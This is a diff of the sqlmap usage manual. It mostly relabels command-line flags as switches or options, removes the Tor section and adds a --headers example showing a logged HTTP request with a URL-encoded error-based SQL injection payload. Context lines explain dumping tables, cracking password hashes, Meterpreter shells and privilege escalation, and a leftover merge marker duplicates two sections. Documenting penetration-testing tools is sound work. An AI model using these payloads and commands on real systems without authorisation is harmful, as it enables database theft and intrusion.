@@ -264,7 +264,6 @@ For example:
 
     python sqlmap.py -d "mysql://admin:admin@192.168.21.17:3306/testdb" -f --banner --dbs --users
 
-
 ### Target URL
 
 Option: `-u` or `--url`
@@ -361,7 +360,7 @@ For example:
 
 **TODO**: needs updating.
 
-Switches: `--cookie`, `--load-cookies` and `--drop-set-cookie`
+Options and switch: `--cookie`, `--load-cookies` and `--drop-set-cookie`
 
 These switches can be useful in two ways:
 
@@ -372,13 +371,13 @@ Either reason brings you to need to send cookies with sqlmap requests, the steps
 
 * Login to the application with your favourite browser.
 * Get the HTTP Cookie from the browser's preferences or from the HTTP proxy screen and copy to the clipboard.
-* Go back to your shell and run sqlmap by pasting your clipboard as the argument of the `--cookie` switch.
+* Go back to your shell and run sqlmap by pasting your clipboard as the argument of the option `--cookie`.
 
 Note that the HTTP `Cookie` header values are usually separated by a `;` character, **not** by an `&`. sqlmap can recognize these as separate sets of `parameter=value` too, as well as GET and POST parameters.
 
 If at any time during the communication, the web application responds with `Set-Cookie` headers, sqlmap will automatically use its value in all further HTTP requests as the `Cookie` header. sqlmap will also automatically test those values for SQL injection. This can be avoided by providing the switch `--drop-set-cookie` - sqlmap will ignore any coming `Set-Cookie` header.
 
-Vice versa, if you provide a HTTP `Cookie` header with `--cookie` switch and the target URL sends an HTTP
+Vice versa, if you provide a HTTP `Cookie` header with option `--cookie` and the target URL sends an HTTP
 `Set-Cookie` header at any time, sqlmap will ask you which set of cookies to use for the following HTTP requests.
 
 Note that also the HTTP `Cookie` header is tested against SQL injection if the `--level` is set to **2** or above. Read below for details.
@@ -391,9 +390,9 @@ By default sqlmap performs HTTP requests with the following `User-Agent` header 
 
     sqlmap/1.0-dev-xxxxxxx (http://sqlmap.org)
 
-However, it is possible to fake it with the `--user-agent` switch by providing custom User-Agent as the switch argument.
+However, it is possible to fake it with the option `--user-agent` by providing custom User-Agent as the option's argument.
 
-Moreover, by providing the `--random-agent` switch, sqlmap will randomly select a `User-Agent` from the `./txt/user-agents.txt` textual file and use it for all HTTP requests within the session.
+Moreover, by providing the switch `--random-agent`, sqlmap will randomly select a `User-Agent` from the `./txt/user-agents.txt` textual file and use it for all HTTP requests within the session.
 
 Some sites perform a server-side check of HTTP `User-Agent` header value and fail the HTTP response if a valid `User-Agent` is not provided, its value is not expected or is blacklisted by a web application firewall or similar intrusion prevention system. In this case sqlmap will show you a message as follows:
 
@@ -423,7 +422,20 @@ Note that also the HTTP `Referer` header is tested against SQL injection if the 
 
 Option: `--headers`
 
-It is possible to provide extra HTTP headers by setting the `--headers` switch. Each header must be separated by a newline and it is much easier to provide them from the configuration INI file. Have a look at the sample `sqlmap.conf` file for an example.
+It is possible to provide extra HTTP headers by setting the option `--headers`. Each header must be separated by a newline and it is much easier to provide them from the configuration INI file. You can take a look at the sample `sqlmap.conf` file for such case.
+
+Example against a MySQL target:
+
+    $ python sqlmap.py -u "http://192.168.21.128/sqlmap/mysql/get_int.php?id=1" -z "ign,flu,bat,tec=E" --headers="Host:www.target.com\nUser-agent:Firefox 1.0" -v 5
+    [...]
+    [xx:xx:44] [TRAFFIC OUT] HTTP request [#5]:
+    GET /sqlmap/mysql/get_int.php?id=1%20AND%20%28SELECT%209351%20FROM%28SELECT%20COUNT%28%2A%29%2CCONCAT%280x3a6161733a%2C%28SELECT%20%28CASE%20WHEN%20%285473%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%3D%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%205473%29%20THEN%201%20ELSE%200%20END%29%29%2C0x3a6c666d3a%2CFLOOR%28RAND%280%29%2A2%29%29x%20FROM%20INFORMATION_SCHEMA.CHARACTER_SETS%20GROUP%20BY%20x%29a%29 HTTP/1.1
+    Host: www.target.com
+    Accept-encoding: gzip,deflate
+    Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
+    User-agent: Firefox 1.0
+    Connection: close
+    [...]
 
 ### HTTP protocol authentication
 
@@ -448,7 +460,7 @@ Example of valid syntax:
 
 Option: `--auth-cert`
 
-This switch should be used in cases when the web server requires proper client-side certificate for authentication. Supplied values should be in the form: `key_file,cert_file`, where `key_file` should be the name of a PEM formatted file that contains your private key, while `cert_file` should be the name for a PEM formatted certificate chain file.
+This option should be used in cases when the web server requires proper client-side certificate for authentication. Supplied values should be in the form: `key_file,cert_file`, where `key_file` should be the name of a PEM formatted file that contains your private key, while `cert_file` should be the name for a PEM formatted certificate chain file.
 
 ### HTTP(S) proxy
 
@@ -457,19 +469,9 @@ Options and switch: `--proxy`, `--proxy-cred` and `--ignore-proxy`
 It is possible to provide an HTTP(S) proxy address to pass by the HTTP(S) requests to the target URL with option `--proxy`. The syntax of HTTP(S) proxy value is `http://url:port`.
 
 If the HTTP(S) proxy requires authentication, you can provide the credentials in the format `username:password` to the
-`--proxy-cred` switch.
+option `--proxy-cred`.
 
 Switch `--ignore-proxy` should be used when you want to run sqlmap against a target part of a local area network by ignoring the system-wide set HTTP(S) proxy server setting.
-
-### Tor anonymity network
-
-Options and switches: `--tor`, `--tor-port`, `--tor-type` and `--check-tor`
-
-If, for any reason, you need to stay anonymous, instead of passing by a single predefined HTTP(S) proxy server, you can configure a [Tor client](http://www.torproject.org/) together with [Privoxy](http://www.privoxy.org) (or similar) on your machine as explained in [Tor installation guides](https://www.torproject.org/docs/installguide.html.en). Then you can use a switch `--tor` and sqlmap will try to automatically set Tor proxy connection settings.
-
-In case that you want to manually set the type and port of used Tor proxy, you can do it with options `--tor-type` and `--tor-port` (e.g. `--tor-type=SOCKS5 --tor-port 9050`).
-
-You are strongly advised to use `--check-tor` occasionally to be sure that everything was set up properly. There are cases when Tor bundles (e.g. Vidalia) come misconfigured (or reset previously set configuration) giving you a false sense of anonymity. Using this switch sqlmap will check that everything works as expected by sending a single request to an official [Are you using Tor?](https://check.torproject.org/) page before any target requests. In case that check fails, sqlmap will warn you and abruptly exit.
 
 ### Delay between each HTTP request
 
@@ -499,7 +501,7 @@ It is possible to specify parameter names whose values you want to be randomly c
 
 Option: `--scope`
 
-Rather than using all hosts parsed from provided logs with switch `-l`, you can specify valid Python regular expression to be used for filtering desired ones.
+Rather than using all hosts parsed from provided logs with option `-l`, you can specify valid Python regular expression to be used for filtering desired ones.
 
 Example of valid syntax:
 
@@ -581,7 +583,7 @@ Note that this switch is incompatible with switch `--text-only`.
 
 ### Concurrent HTTP(S) requests
 
-Switch: `--threads`
+Option: `--threads`
 
 It is possible to specify the maximum number of concurrent HTTP(S) requests that sqlmap is allowed to do.
 This feature relies on [multi-threading](http://en.wikipedia.org/wiki/Multithreading) concept and inherits both its pro and its cons.
@@ -590,7 +592,7 @@ This features applies to the brute-force switches and when the data fetching is 
 
 The maximum number of concurrent requests is set to **10** for performance and site reliability reasons.
 
-Note that this switch is not compatible with `--predict-output` switch.
+Note that this option is not compatible with switch `--predict-output`.
 
 ## Injection
 
@@ -645,7 +647,7 @@ Note that this option is **not** mandatory and it is strongly recommended to use
 
 Option: `--os`
 
-By default sqlmap automatically detects the web application's back-end database management system underlying operating system when this information is a dependence of any other provided switch. At the moment the fully supported operating systems are two:
+By default sqlmap automatically detects the web application's back-end database management system underlying operating system when this information is a dependence of any other provided switch or option. At the moment the fully supported operating systems are:
 
 * Linux
 * Windows
@@ -710,9 +712,9 @@ Option: `--tamper`
 
 sqlmap itself does no obfuscation of the payload sent, except for strings between single quotes replaced by their `CHAR()`-alike representation. 
 
-This switch can be very useful and powerful in situations where there is a weak input validation mechanism between you and the back-end database management system. This mechanism usually is a self-developed input validation routine called by the application source code, an expensive enterprise-grade IPS appliance or a web application firewall (WAF). All buzzwords to define the same concept, implemented in a different way and costing lots of money, usually. 
+This option can be very useful and powerful in situations where there is a weak input validation mechanism between you and the back-end database management system. This mechanism usually is a self-developed input validation routine called by the application source code, an expensive enterprise-grade IPS appliance or a web application firewall (WAF). All buzzwords to define the same concept, implemented in a different way and costing lots of money, usually. 
 
-To take advantage of this switch, provide sqlmap with a comma-separated list of tamper scripts and this will process the payload and return it transformed. You can define your own tamper scripts, use sqlmap ones from the `tamper/` folder or edit them as long as you concatenate them comma-separated as the argument of `--tamper` switch. 
+To take advantage of this option, provide sqlmap with a comma-separated list of tamper scripts and this will process the payload and return it transformed. You can define your own tamper scripts, use sqlmap ones from the `tamper/` folder or edit them as long as you concatenate them comma-separated as the argument of option `--tamper`. 
 
 The format of a valid tamper script is as follows:
 
@@ -771,9 +773,9 @@ These options can be used to customize the detection phase.
 
 Option: `--level`
 
-This switch requires an argument which specifies the level of tests to perform. There are **five** levels. The default value is **1** where limited number of tests (requests) are performed. Vice versa, level **5** will test verbosely for a much larger number of payloads and boundaries (as in pair of SQL payload prefix and suffix). The payloads used by sqlmap are specified in the textual file `xml/payloads.xml`. Following the instructions on top of the file, if sqlmap misses an injection, you should be able to add your own payload(s) to test for too!
+This option requires an argument which specifies the level of tests to perform. There are **five** levels. The default value is **1** where limited number of tests (requests) are performed. Vice versa, level **5** will test verbosely for a much larger number of payloads and boundaries (as in pair of SQL payload prefix and suffix). The payloads used by sqlmap are specified in the textual file `xml/payloads.xml`. Following the instructions on top of the file, if sqlmap misses an injection, you should be able to add your own payload(s) to test for too!
 
-Not only this switch affects which payload sqlmap tries, but also which injection points are taken in exam: GET and POST parameters are **always** tested, HTTP Cookie header values are tested from level **2** and HTTP User-Agent/Referer headers' value is tested from level **3**.
+Not only this option affects which payload sqlmap tries, but also which injection points are taken in exam: GET and POST parameters are **always** tested, HTTP Cookie header values are tested from level **2** and HTTP User-Agent/Referer headers' value is tested from level **3**.
 
 All in all, the harder it is to detect a SQL injection, the higher the `--level` must be set.
 
@@ -783,9 +785,9 @@ It is strongly recommended to higher this value before reporting to the mailing 
 
 Option: `--risk`
 
-This switch requires an argument which specifies the risk of tests to perform. There are **four** risk values. The default value is **1** which is innocuous for the majority of SQL injection points. Risk value 2 adds to the default level the tests for heavy query time-based SQL injections and value 3 adds also `OR`-based SQL injection tests.
+This option requires an argument which specifies the risk of tests to perform. There are **four** risk values. The default value is **1** which is innocuous for the majority of SQL injection points. Risk value 2 adds to the default level the tests for heavy query time-based SQL injections and value 3 adds also `OR`-based SQL injection tests.
 
-In some instances, like a SQL injection in an `UPDATE` statement, injecting an `OR`-based payload can lead to an update of all the entries of the table, which is certainly not what the attacker wants. For this reason and others this switch has been introduced: the user has control over which payloads get tested, the user can arbitrarily choose to use also potentially dangerous ones. As per the previous switch, the payloads used by sqlmap are specified in the textual file `xml/payloads.xml` and you are free to edit and add your owns.
+In some instances, like a SQL injection in an `UPDATE` statement, injecting an `OR`-based payload can lead to an update of all the entries of the table, which is certainly not what the attacker wants. For this reason and others this option has been introduced: the user has control over which payloads get tested, the user can arbitrarily choose to use also potentially dangerous ones. As per the previous option, the payloads used by sqlmap are specified in the textual file `xml/payloads.xml` and you are free to edit and add your owns.
 
 ### Page comparison
 
@@ -802,7 +804,7 @@ Switches: `--text-only` and `--titles`
 
 In cases when user knows that the distinction of a `True` query from a `False` one can be done using HTML title (e.g. `Welcome` for `True` and `Forbidden` for `False`), he can turn turn on title-based comparison using switch `--titles`.
 
-In cases with lot of active content (e.g. scripts, embeds, etc.) in the HTTP responses' body, you can filter pages (`--text-only` switch) just for their textual content. This way, in a good number of cases, you can automatically tune the detection engine.
+In cases with lot of active content (e.g. scripts, embeds, etc.) in the HTTP responses' body, you can filter pages (switch `--text-only`) just for their textual content. This way, in a good number of cases, you can automatically tune the detection engine.
 
 ## Techniques
 
@@ -812,11 +814,11 @@ These options can be used to tweak testing of specific SQL injection techniques.
 
 Option: `--technique`
 
-This switch can be used to specify which SQL injection type to test for. By default sqlmap tests for **all** types/techniques it supports.
+This option can be used to specify which SQL injection type to test for. By default sqlmap tests for **all** types/techniques it supports.
 
-In certain situations you may want to test only for one or few specific types of SQL injection thought and this is where this switch comes into play. 
+In certain situations you may want to test only for one or few specific types of SQL injection thought and this is where this option comes into play. 
 
-This switch requires an argument. Such argument is a string composed by any combination of `B`, `E`, `U`, `S`, `T` and `Q` characters where each letter stands for a different technique: 
+This option requires an argument. Such argument is a string composed by any combination of `B`, `E`, `U`, `S`, `T` and `Q` characters where each letter stands for a different technique: 
 
 * `B`: Boolean-based blind
 * `E`: Error-based
@@ -841,7 +843,7 @@ Option: `--union-cols`
 
 By default sqlmap tests for UNION query SQL injection technique using 1 to 10 columns. However, this range can be increased up to 50 columns by providing an higher `--level` value. See the relevant paragraph for more details. 
 
-You can manually tell sqlmap to test for this type of SQL injection with a specific range of columns by providing the tool with the `--union-cols` switch followed by a range of integers. For instance, `12-16` means tests for UNION query SQL injection by using 12 up to 16 columns. 
+You can manually tell sqlmap to test for this type of SQL injection with a specific range of columns by providing the tool with the option `--union-cols` followed by a range of integers. For instance, `12-16` means tests for UNION query SQL injection by using 12 up to 16 columns. 
 
 ### Character to use to test for UNION query SQL injection
 
@@ -881,9 +883,9 @@ Switches: `-f` or `--fingerprint`
 
 By default the web application's back-end database management system fingerprint is handled automatically by sqlmap. Just after the detection phase finishes and the user is eventually prompted with a choice of which vulnerable parameter to use further on, sqlmap fingerprints the back-end database management system and continues on with the injection by knowing which SQL syntax, dialect and queries to use to proceed with the attack within the limits of the database architecture. 
 
-If for any instance you want to perform an extensive database management system fingerprint based on various techniques like specific SQL dialects and inband error messages, you can provide the `--fingerprint` switch. sqlmap will perform a lot more requests and fingerprint the exact DBMS version and, where possible, operating system, architecture and patch level. 
+If for any instance you want to perform an extensive database management system fingerprint based on various techniques like specific SQL dialects and inband error messages, you can provide the switch `--fingerprint`. sqlmap will perform a lot more requests and fingerprint the exact DBMS version and, where possible, operating system, architecture and patch level. 
 
-If you want the fingerprint to be even more accurate result, you can also provide the `-b` or `--banner` switch. 
+If you want the fingerprint to be even more accurate result, you can also provide the switch `-b` or `--banner`. 
 
 ## Enumeration
 
@@ -933,7 +935,7 @@ When the session user has read access to the system table containing information
 
 ### List and crack database management system users password hashes
 
-Switches: `--passwords` and `-U`
+Switch: `--passwords`
 
 When the session user has read access to the system table containing information about the DBMS users' passwords, it is possible to enumerate the password hashes for each database management system user. sqlmap will first enumerate the users, then the different password hashes for each of them. 
 
@@ -964,15 +966,15 @@ Not only sqlmap enumerated the DBMS users and their passwords, but it also recog
 
 This feature has been implemented for all DBMS where it is possible to enumerate users' password hashes, including Oracle and Microsoft SQL Server pre and post 2005. 
 
-You can also provide the `-U` option to specify the specific user who you want to enumerate and eventually crack the password hash(es). If you provide `CU` as username it will consider it as an alias for current user and will retrieve the password hash(es) for this user. 
+You can also provide the option `-U` to specify the specific user who you want to enumerate and eventually crack the password hash(es). If you provide `CU` as username it will consider it as an alias for current user and will retrieve the password hash(es) for this user. 
 
 ### List database management system users privileges
 
-Switches: `--privileges` and `-U`
+Switch: `--privileges`
 
 When the session user has read access to the system table containing information about the DBMS users, it is possible to enumerate the privileges for each database management system user. By the privileges, sqlmap will also show you which are database administrators.
 
-You can also provide the `-U` option to specify the user who you want to enumerate the privileges.
+You can also provide the option `-U` to specify the user who you want to enumerate the privileges.
 
 If you provide `CU` as username it will consider it as an alias for current user and will enumerate the privileges for this user. 
 
@@ -980,11 +982,11 @@ On Microsoft SQL Server, this feature will display you whether or not each user 
 
 ### List database management system users roles
 
-Switches: `--roles` and `-U`
+Switch: `--roles`
 
 When the session user has read access to the system table containing information about the DBMS users, it is possible to enumerate the roles for each database management system user.
 
-You can also provide the `-U` option to specify the user who you want to enumerate the privileges.
+You can also provide the option `-U` to specify the user who you want to enumerate the privileges.
 
 If you provide `CU` as username it will consider it as an alias for current user and will enumerate the privileges for this user.
 
@@ -998,13 +1000,13 @@ When the session user has read access to the system table containing information
 
 ### Enumerate database's tables
 
-Switches: `--tables`, `-D` and `--exclude-sysdbs`
+Switches and option: `--tables`, `--exclude-sysdbs` and `-D`
 
 When the session user has read access to the system table containing information about databases' tables, it is possible to enumerate the list of tables for a specific database management system's databases.
 
-If you do not provide a specific database with switch `-D`, sqlmap will enumerate the tables for all DBMS databases.
+If you do not provide a specific database with option `-D`, sqlmap will enumerate the tables for all DBMS databases.
 
-You can also provide the `--exclude-sysdbs` switch to exclude all system databases.
+You can also provide the switch `--exclude-sysdbs` to exclude all system databases.
 
 Note that on Oracle you have to provide the `TABLESPACE_NAME` instead of the database name.
 
@@ -1120,7 +1122,7 @@ Switch and options: `--dump`, `-C`, `-T`, `-D`, `--start`, `--stop`, `--first` a
 
 When the session user has read access to a specific database's table it is possible to dump the table entries.
 
-This functionality depends on switch `-T` to specify the table name and optionally on switch `-D` to specify the database name. If the table name is provided, but the database name is not, the current database name is used.
+This functionality depends on option `-T` to specify the table name and optionally on option `-D` to specify the database name. If the table name is provided, but the database name is not, the current database name is used.
 
 Example against a Firebird target:
 
@@ -1138,15 +1140,15 @@ Example against a Firebird target:
     | 4  | NULL   | nameisnull |
     +----+--------+------------+
 
-This switch can also be used to dump all tables' entries of a provided database. You simply have to provide sqlmap with the `--dump` switch along with only the `-D` switch, no `-T` and no `-C`. 
+This switch can also be used to dump all tables' entries of a provided database. You simply have to provide sqlmap with the switch `--dump` along with only the option `-D` (no `-T` and no `-C`).
 
-You can also provide a comma-separated list of the specific columns to dump with the `-C` switch.
+You can also provide a comma-separated list of the specific columns to dump with the option `-C`.
 
 sqlmap also generates for each table dumped the entries in a CSV format textual file. You can see the absolute path where sqlmap creates the file by providing a verbosity level greater than or equal to **1**.
 
-If you want to dump only a range of entries, then you can provide switches `--start` and/or `--stop` to respectively start to dump from a certain entry and stop the dump at a certain entry. For instance, if you want to dump only the first entry, provide `--stop 1` in your command line. Vice versa if, for instance, you want to dump only the second and third entry, provide `--start 1` `--stop 3`.
+If you want to dump only a range of entries, then you can provide options `--start` and/or `--stop` to respectively start to dump from a certain entry and stop the dump at a certain entry. For instance, if you want to dump only the first entry, provide `--stop 1` in your command line. Vice versa if, for instance, you want to dump only the second and third entry, provide `--start 1` `--stop 3`.
 
-It is also possible to specify which single character or range of characters to dump with switches `--first` and `--last`. For instance, if you want to dump columns' entries from the third to the fifth character, provide `--first 3` `--last 5`. This feature only applies to the blind SQL injection techniques because for error-based and UNION query SQL injection techniques the number of requests is exactly the same, regardless of the length of the column's entry output to dump.
+It is also possible to specify which single character or range of characters to dump with options `--first` and `--last`. For instance, if you want to dump columns' entries from the third to the fifth character, provide `--first 3` `--last 5`. This feature only applies to the blind SQL injection techniques because for error-based and UNION query SQL injection techniques the number of requests is exactly the same, regardless of the length of the column's entry output to dump.
 
 As you may have noticed by now, sqlmap is **flexible**: you can leave it to automatically dump the whole database table or you can be very precise in which characters to dump, from which columns and which range of entries.
 
@@ -1156,7 +1158,7 @@ Switches: `--dump-all` and `--exclude-sysdbs`
 
 It is possible to dump all databases tables entries at once that the session user has read access on.
 
-You can also provide the `--exclude-sysdbs` switch to exclude all system databases. In that case sqlmap will only dump entries of users' databases tables.
+You can also provide the switch `--exclude-sysdbs` to exclude all system databases. In that case sqlmap will only dump entries of users' databases tables.
 
 Note that on Microsoft SQL Server the `master` database is not considered a system database because some database administrators use it as a users' database.
 
@@ -1168,7 +1170,7 @@ This switch allows you to **search for specific database names, specific tables 
 
 This is useful, for instance, to identify tables containing custom application credentials where relevant columns' names contain string like _name_ and _pass_.
 
-Switch `--search` needs to be used in conjunction with one of the following support switches:
+Switch `--search` needs to be used in conjunction with one of the following support options:
 
 * `-C` following a list of comma-separated column names to look for across the whole database management system.
 * `-T` following a list of comma-separated table names to look for across the whole database management system.
@@ -1223,14 +1225,14 @@ These switches can be used to run brute force checks.
 
 Switch: `--common-tables`
 
-There are cases where `--tables` switch can not be used to retrieve the databases' table names. These cases usually fit into one of the following categories: 
+There are cases where switch `--tables` can not be used to retrieve the databases' table names. These cases usually fit into one of the following categories: 
 
 * The database management system is MySQL **< 5.0** where `information_schema` is not available.
 * The database management system is Microsoft Access and system table `MSysObjects` is not readable - default setting.
 * The session user does not have read privileges against the system table storing the scheme of the databases.
 
-If any of the first two cases apply and you provided the `--tables` switch, sqlmap will prompt you with a question
-to fall back to this technique. Either of these cases apply to your situation, sqlmap can possibly still identify some existing tables if you provide it with the `--common-tables` switch. sqlmap will perform a brute-force attack in order to detect the existence of common tables across the DBMS.
+If any of the first two cases apply and you provided the switch `--tables`, sqlmap will prompt you with a question
+to fall back to this technique. Either of these cases apply to your situation, sqlmap can possibly still identify some existing tables if you provide it with the switch `--common-tables`. sqlmap will perform a brute-force attack in order to detect the existence of common tables across the DBMS.
 
 The list of common table names is `txt/common-tables.txt` and you can edit it as you wish.
 
@@ -1265,14 +1267,14 @@ Example against a MySQL 4.1 target:
 
 Switch: `--common-columns`
 
-As per tables, there are cases where `--columns` switch can not be used to retrieve the databases' tables' column names. These cases usually fit into one of the following categories: 
+As per tables, there are cases where switch `--columns` can not be used to retrieve the databases' tables' column names. These cases usually fit into one of the following categories: 
 
 * The database management system is MySQL **< 5.0** where `information_schema` is not available.
 * The database management system is Microsoft Access where this kind of information is not available inside system tables.
 * The session user does not have read privileges against the system table storing the scheme of the databases.
 
-If any of the first two cases apply and you provided the `--columns` switch, sqlmap will prompt you with a question
-to fall back to this technique. Either of these cases apply to your situation, sqlmap can possibly still identify some existing tables if you provide it with the `--common-columns` switch. sqlmap will perform a brute-force attack in order to detect the existence of common columns across the DBMS.
+If any of the first two cases apply and you provided the switch `--columns`, sqlmap will prompt you with a question
+to fall back to this technique. Either of these cases apply to your situation, sqlmap can possibly still identify some existing tables if you provide it with the switch `--common-columns`. sqlmap will perform a brute-force attack in order to detect the existence of common columns across the DBMS.
 
 The list of common table names is `txt/common-columns.txt` and you can edit it as you wish.
 
@@ -1410,7 +1412,7 @@ Where stacked queries has not been identified on the web application (e.g. PHP o
 
 ### Out-of-band stateful connection: Meterpreter & friends
 
-Options and switches: `--os-pwn`, `--os-smbrelay`, `--os-bof`, `--priv-esc`, `--msf-path` and `--tmp-path`
+Switches and options: `--os-pwn`, `--os-smbrelay`, `--os-bof`, `--priv-esc`, `--msf-path` and `--tmp-path`
 
 It is possible to establish an **out-of-band stateful TCP connection between the attacker machine and the database server** underlying operating system when the back-end database management system is either MySQL, PostgreSQL or Microsoft SQL Server, and the session user has the needed privileges to abuse database specific functionalities and architectural weaknesses. This channel can be an interactive command prompt, a Meterpreter session or a graphical user interface (VNC) session as per user's choice. 
 
@@ -1534,7 +1536,7 @@ Example against a MySQL target:
 
 By default MySQL on Windows runs as `SYSTEM`, however PostgreSQL runs as a low-privileged user `postgres` on both Windows and Linux. Microsoft SQL Server 2000 by default runs as `SYSTEM`, whereas Microsoft SQL Server 2005 and 2008 run most of the times as `NETWORK SERVICE` and sometimes as `LOCAL SERVICE`. 
 
-It is possible to provide sqlmap with the `--priv-esc` switch to perform a **database process' user privilege escalation** via Metasploit's `getsystem` command which include, among others, the [kitrap0d](http://archives.neohapsis.com/archives/fulldisclosure/2010-01/0346.html) technique ([MS10-015](http://www.microsoft.com/technet/security/bulletin/ms10-015.mspx)).
+It is possible to provide sqlmap with switch `--priv-esc` to perform a **database process' user privilege escalation** via Metasploit's `getsystem` command which include, among others, the [kitrap0d](http://archives.neohapsis.com/archives/fulldisclosure/2010-01/0346.html) technique ([MS10-015](http://www.microsoft.com/technet/security/bulletin/ms10-015.mspx)).
 
 ## Windows registry access
 
@@ -1542,27 +1544,27 @@ It is possible to access Windows registry when the back-end database management 
 
 ### Read a Windows registry key value
 
-Option: `--reg-read`
+Switch: `--reg-read`
 
-Using this option you can read registry key values.
+Using this switch you can read registry key values.
 
 ### Write a Windows registry key value
 
-Option: `--reg-add`
+Switch: `--reg-add`
 
-Using this option you can write registry key values.
+Using this switch you can write registry key values.
 
 ### Delete a Windows registry key
 
-Option: `--reg-del`
+Switch: `--reg-del`
 
-Using this option you can delete registry keys.
+Using this switch you can delete registry keys.
 
-### Auxiliary registry switches
+### Auxiliary registry options
 
 Options: `--reg-key`, `--reg-value`, `--reg-data` and `--reg-type`
 
-These switches can be used to provide data needed for proper running of options `--reg-read`, `--reg-add` and  `--reg-del`. So, instead of providing registry key information when asked, you can use them at command prompt as program arguments. 
+These options can be used to provide data needed for proper running of switches `--reg-read`, `--reg-add` and  `--reg-del`. So, instead of providing registry key information when asked, you can use them at command prompt as program arguments. 
 
 With `--reg-key` option you specify used Windows registry key path, with `--reg-value` value item name inside provided key, with `--reg-data` value data, while with `--reg-type` option you specify type of the value item.
 
@@ -1575,17 +1577,29 @@ A sample command line for adding a registry key hive follows:
 
 These options can be used to set some general working parameters.
 
-### Load session
+### Load session from a stored (.sqlite) file
 
 Option: `-s`
 
-**TODO**: needs updating.
+sqlmap automatically creates a persistent session SQLite file for each target, inside dedicated output directory, where it stores all data required for session resumal. If user wants to explicitly set the session file location (e.g. for storing of session data for multiple targets at one place) he can use this option.
 
 ### Log HTTP(S) traffic to a textual file
 
 Option: `-t`
 
 This switch requires an argument that specified the textual file to write all HTTP(s) traffic generated by sqlmap: HTTP(S) requests and HTTP(S) responses.
+=======
+### Load session from a stored (.sqlite) file
+
+Option: `-s`
+
+sqlmap automatically creates a persistent session SQLite file for each target, inside dedicated output directory, where it stores all data required for session resumal. If user wants to explicitly set the session file location (e.g. for storing of session data for multiple targets at one place) he can use this option.
+
+### Log HTTP(s) traffic to a textual file
+
+Option: `-t`
+
+This option requires an argument that specified the textual file to write all HTTP(s) traffic generated by sqlmap - HTTP(S) requests and HTTP(S) responses. 
 
 This is useful primarily for debug purposes - when you provide the developers with a potential bug report, send this file too.
 
@@ -1593,7 +1607,7 @@ This is useful primarily for debug purposes - when you provide the developers wi
 
 Switch: `--batch`
 
-If you want sqlmap to run as a batch tool, without any user's interaction  when sqlmap requires it, you can force that by using `--batch` switch. This will leave sqlmap to go with a default behaviour whenever user's input would be required. 
+If you want sqlmap to run as a batch tool, without any user's interaction  when sqlmap requires it, you can force that by using switch `--batch`. This will leave sqlmap to go with a default behaviour whenever user's input would be required. 
 
 ### Force character encoding used for data retrieval
 
@@ -1613,12 +1627,12 @@ Example run against a MySQL target:
 
     $ python sqlmap.py -u "http://192.168.21.128/sqlmap/mysql/" --batch --crawl=3
     [...]
-    [11:54:53] [INFO] starting crawler
-    [11:54:53] [INFO] searching for links with depth 1
-    [11:54:53] [WARNING] running in a single-thread mode. This could take a while
-    [11:54:53] [INFO] searching for links with depth 2
-    [11:54:54] [INFO] heuristics detected web page charset 'ascii'
-    [11:55:00] [INFO] 42/56 links visited (75%)
+    [xx:xx:53] [INFO] starting crawler
+    [xx:xx:53] [INFO] searching for links with depth 1
+    [xx:xx:53] [WARNING] running in a single-thread mode. This could take a while
+    [xx:xx:53] [INFO] searching for links with depth 2
+    [xx:xx:54] [INFO] heuristics detected web page charset 'ascii'
+    [xx:xx:00] [INFO] 42/56 links visited (75%)
     [...]
 
 ### Delimiting character used in CSV output
@@ -1658,7 +1672,7 @@ Example against an Oracle target affected only by boolean-based blind SQL inject
 
 Then:
 
-    100% [===================================================] 64/64               
+    100% [===================================================] 64/64
     [hh:mm:53] [INFO] retrieved: Oracle Database 10g Enterprise Edition Release 10.2.0.1.0 - Prod
 
     web application technology: PHP 5.2.6, Apache 2.2.9
@@ -1677,7 +1691,7 @@ As you are already familiar with the concept of a session file from the descript
 
 Switch: `--force-ssl`
 
-In case that user wants to force usage of SSL/HTTPS requests toward the target, he can use this switch. This can be useful in cases when urls are being collected by using switch `--crawl` or when Burp log is being provided with option `-l`.
+In case that user wants to force usage of SSL/HTTPS requests toward the target, he can use this switch. This can be useful in cases when urls are being collected by using option `--crawl` or when Burp log is being provided with option `-l`.
 
 ### Parse and test forms' input fields
 
@@ -1706,10 +1720,10 @@ Example against a PostgreSQL target:
     $ python sqlmap.py -u "http://192.168.48.130/sqlmap/pgsql/get_int.php?id=1" --banner --hex -v 3 --parse-errors
 
     [...]
-    [20:01:14] [INFO] fetching banner
